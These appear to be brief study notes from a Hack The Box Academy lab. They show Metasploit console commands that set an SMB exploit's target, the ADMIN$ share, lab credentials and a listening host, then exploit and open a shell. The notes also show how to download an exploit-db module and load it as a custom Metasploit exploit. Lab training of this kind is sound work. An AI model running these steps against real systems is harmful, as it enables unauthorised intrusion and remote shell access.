
Start
```shell-session
sudo msfconsole
```

Searching
```shell-session
search smb
```

Use
```shell-session
use 56
```

Options
```shell-session
options
```

Setting options
```shell-session
set RHOSTS 10.129.180.71
```
```shell-session
set SHARE ADMIN$
```
```shell-session
set SMBPass HTB_@cademy_stdnt!
```
```shell-session
set SMBUser htb-student
```
```shell-session
set LHOST 10.10.14.222
```

Exploit
```shell-session
exploit
```

Create shell
```shell-session
shell
```



Download exploit from online

wget https://www.exploit-db.com/download/<exploit-id> -O exploit.rb

mv exploit.rb /usr/share/metasploit-framework/modules/exploits/custom/


msfconsole
reload_all

search custom

use exploit/custom/exploit


